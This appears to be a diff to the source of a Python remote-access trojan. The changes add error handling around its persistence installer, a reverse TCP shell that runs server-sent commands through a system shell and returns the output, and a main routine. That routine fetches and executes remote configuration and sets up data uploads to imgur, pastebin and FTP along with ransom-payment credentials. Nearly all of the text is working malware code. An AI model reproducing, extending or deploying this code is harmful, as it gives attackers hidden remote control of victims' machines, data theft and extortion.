-                return json.dumps(self.persistence.methods)
-            elif not method or cmd not in ('add','remove') or method not in self.persistence.methods:
-                return self.persistence.usage
-            elif self.persistence.methods[method].get('established'):
-                return json.dumps(self.persistence.methods[method])
+        try:
+            if not args:
+                for method in [_ for _ in self.persistence.methods if not self.persistence.methods[_]['established']]:
+                    target = '_persistence_add_{}'.format(method)
+                    if sys.platform in getattr(self, target).platforms:
+                        established, result = getattr(self, target)()
+                        self.persistence.methods[method]['established'] = established
+                        self.persistence.methods[method]['result'] = result
+                return json.dumps({k: v for k,v in self.persistence.methods if sys.platform in getattr(self, k).platforms}, indent=2)
             else:
-                target = '_persistence_{}_{}'.format(cmd, method)
-                if sys.platform in getattr(self, target).platforms:
-                    established, result = getattr(self, target)()
-                    self.persistence.methods[method]['established'] = established
-                    self.persistence.methods[method]['result'] = result
+                cmd, _, method = str(args).partition(' ')
+                method = method.replace(' ','_') if ' ' in method else method
+                if 'method' in cmd:
+                    return json.dumps(self.persistence.methods)
+                elif not method or cmd not in ('add','remove') or method not in self.persistence.methods:
+                    return self.persistence.usage
+                elif self.persistence.methods[method].get('established'):
+                    return json.dumps(self.persistence.methods[method])
                 else:
-                    self.persistence.methods[method]['established'] = False
-                    self.persistence.methods[method]['result'] = "Persistence method '{}' is not compatible with {}".format(method, sys.platform)
-                return json.dumps(self.persistence.methods[method])
+                    target = '_persistence_{}_{}'.format(cmd, method)
+                    if sys.platform in getattr(self, target).platforms:
+                        established, result = getattr(self, target)()
+                        self.persistence.methods[method]['established'] = established
+                        self.persistence.methods[method]['result'] = result
+                    return json.dumps(self.persistence.methods[method])
+        except Exception as e:
+            return "{} returned error: '{}'".format(self.persistence.func_name, str(e))
 
+        
 
     @config(platforms=['linux2','darwin'], command=True, usage='packetsniffer [mode]')
     def packetsniffer(self, *args):
@@ -2037,52 +2067,58 @@ class Client(object):
         """
         create secure connection with server and start new session 
         """
-        self.kill()
-        self._session['socket']      = self._get_connection()
-        self._session['key']         = self._get_session_key()
-        self._session['id']          = self._get_session_id()
-        self._session['public_key']  = self._get_public_key()
+        try:
+            self.kill()
+            self._session['socket']      = self._get_new_connection()
+            self._session['key']         = self._get_session_key()
+            self._session['id']          = self._get_session_id()
+            self._session['public_key']  = self._get_public_key()
+        except Exception as e:
+            return "{} returned error: '{}'".format(self.connect.func_name, str(e))
 
 
     def reverse_tcp_shell(self):
         """
         send encrypted shell back to server via outgoing TCP connection
         """
-        self._send(**{'id': '0' * 64, 'client_id': self._info['id'], 'session_id': self._session['id'], 'task': 'prompt', 'data': '[{} @ %s]> ' % os.getcwd()})
-        while True:
-            if self._session['connection'].wait(timeout=3.0):
-                if not self._session['prompt'].is_set():
-                    task   = self._recv()
-                    if task:
-                        result = ""
-                        command, _, action  = bytes(task['task']).partition(' ')
-                        if command in self._commands:
-                            try:
-                                result  = bytes(self._commands[command]['method'](action)) if len(action) else bytes(self._commands[command]['method']())
-                            except Exception as e1:
-                                result  = "Error: %s" % bytes(e1)
-                        else:
-                            try:
-                                result  = bytes().join(subprocess.Popen(command, 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, shell=True).communicate())
-                            except Exception as e2:
-                                result  = "Error: %s" % bytes(e2)
-                                
-                        if result and result != "None":
-                            task.update({"data": result})
-                            self._results[time.ctime()] = task
-                            self._send(**task)
-                        self._session['prompt'].set()
-            else:        
-                self.debug("\nReverse TCP shell died\n")
-                break
-        self.kill()
-        return self.run()
+        try:
+            self._send(**{'id': '0' * 64, 'client_id': self._info['id'], 'session_id': self._session['id'], 'task': 'prompt', 'data': '[{} @ %s]> ' % os.getcwd()})
+            while True:
+                if self._session['connection'].wait(timeout=3.0):
+                    if not self._session['prompt'].is_set():
+                        task   = self._recv()
+                        if task:
+                            result = ""
+                            command, _, action  = bytes(task['task']).partition(' ')
+                            if command in self._commands:
+                                try:
+                                    result  = bytes(self._commands[command]['method'](action)) if len(action) else bytes(self._commands[command]['method']())
+                                except Exception as e1:
+                                    result  = "Error: %s" % bytes(e1)
+                            else:
+                                try:
+                                    result  = bytes().join(subprocess.Popen(command, 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, shell=True).communicate())
+                                except Exception as e2:
+                                    result  = "Error: %s" % bytes(e2)
+                                    
+                            if result and result != "None":
+                                task.update({"data": result})
+                                self._results[time.ctime()] = task
+                                self._send(**task)
+                            self._session['prompt'].set()
+                else:        
+                    self.debug("{} stopped".format(self.reverse_tcp_shell.func_name))
+                    break
+            self.kill()
+            return self.run()
+        except Exception as e:
+            return "{} returned error: '{}'".format(self.reverse_tcp_shell.func_name, str(e))
 
 
     @staticmethod
     def debug(data):
         """
-        prints client output if debugging is enabled
+        prints client output to console if debugging is enabled
         """
         if Client._debug:
             with Client._lock:
@@ -2093,50 +2129,56 @@ class Client(object):
         """
         start a secure reverse tcp shell between client and server
         """
-        self.connect(*args, **kwargs)
-        self._jobs[self.reverse_tcp_shell.func_name] = threading.Thread(target=self.reverse_tcp_shell, name=time.time())
-        self._jobs[self.reverse_tcp_shell.func_name].start()
-        self._jobs[self._get_prompt.func_name[1:]] = threading.Thread(target=self._get_prompt, name=time.time())
-        self._jobs[self._get_prompt.func_name[1:]].daemon = True
-        self._jobs[self._get_prompt.func_name[1:]].start()
-        self._jobs[self._task_monitor.func_name[1:]] = threading.Thread(target=self._task_monitor, name=time.time())
-        self._jobs[self._task_monitor.func_name[1:]].daemon = True
-        self._jobs[self._task_monitor.func_name[1:]].start()
+        try:
+            self.connect(*args, **kwargs)
+            self._jobs['reverse_tcp_shell'] = threading.Thread(target=self.reverse_tcp_shell, name=time.time())
+            self._jobs['reverse_tcp_shell'].start()
+            self._jobs['shell_prompt'] = threading.Thread(target=self._get_shell_prompt, name=time.time())
+            self._jobs['shell_prompt'].daemon = True
+            self._jobs['shell_prompt'].start()
+            self._jobs['task_manager'] = threading.Thread(target=self._task_manager, name=time.time())
+            self._jobs['task_manager'].daemon = True
+            self._jobs['task_manager'].start()
+        except Exception as e:
+            return "{} returned error: '{}'".format(self.run.func_name, str(e))
 
 
 
 
 def main(*args, **kwargs):
     try:
-        if 'v' in kwargs or '--debug' in sys.argv:
-            Client._debug   = True
+        if '--debug' in sys.argv:
+            Client._debug = True
             Client.debug("\nDebugging mode enabled\n")
         if 'f' not in kwargs and '__file__' in globals():
             kwargs['f'] = bytes_to_long(globals()['__file__'])            
         if 'w' in kwargs:
             exec "import urllib" in globals()
             w = kwargs.get('w')
-            imports     = Client._get_config(w)
+            imports = Client._get_config(w)
             exec imports in globals()           
+        if 'v' in kwargs:
+            v = kwargs.get('v')
+            Client._save = Client._get_config(v).splitlines()
         if 'd' in kwargs:
             d = kwargs.get('d')
             imgur_api_key= Client._get_config(d)
-            Client._configure('_upload_imgur', api_key=imgur_api_key)
+            Client._get_new_option('_upload_imgur', api_key=imgur_api_key)
         if 'c' in kwargs:
             c = kwargs.get('c')
             pastebin_api_key, pastebin_user_key = Client._get_config(c).splitlines()
-            Client._configure('_upload_pastebin', api_dev_key=pastebin_api_key, api_User_key=pastebin_user_key)            
+            Client._get_new_option('_upload_pastebin', api_dev_key=pastebin_api_key, api_User_key=pastebin_user_key)            
         if 'q' in kwargs:
             q = kwargs.get('q')
             ftp_host, ftp_user, ftp_passwd  = Client._get_config(q).splitlines()
-            Client._configure('_upload_ftp', hostname=ftp_host, username=ftp_user, password=ftp_passwd)
+            Client._get_new_option('_upload_ftp', hostname=ftp_host, username=ftp_user, password=ftp_passwd)
         if 'p' in kwargs:
             p = kwargs.get('p')
             ransom_account_id, ransom_api_key, ransom_api_secret, ransom_api_version = Client._get_config(p).splitlines()
-            Client._configure('_ransom_payment', account_id=ransom_account_id, api_key=ransom_api_key, api_secret=ransom_api_secret, api_version=ransom_api_version)
+            Client._get_new_option('_ransom_payment', account_id=ransom_account_id, api_key=ransom_api_key, api_secret=ransom_api_secret, api_version=ransom_api_version)
     finally:
         payload = Client(**kwargs)
-        payload.run() if not Client._debug else payload.run(host='127.0.0.1', port=1337)
+        #payload.run() if not Client._debug else payload.run(host='127.0.0.1', port=1337)
         return payload
 
 
@@ -2149,14 +2191,13 @@ if __name__ == '__main__':
   "g": "79328323225122003561",
   "j": "76650156158318301560",
   "l": "81040047328712224353",
-  "o": "80180089838536317512",
   "p": "80692935077109257793",
   "q": "80324520337976078676",
   "r": "81126388790932157784",
   "s": "81340939681778199109",
   "t": "79310384705633414777",
   "u": "76299683425183950643",
-  "v": "00000000000000000000",
+  "v": "79169592366247143984",
   "w": "77888090548015223857",
   "z": "79892739118577505130"
 })
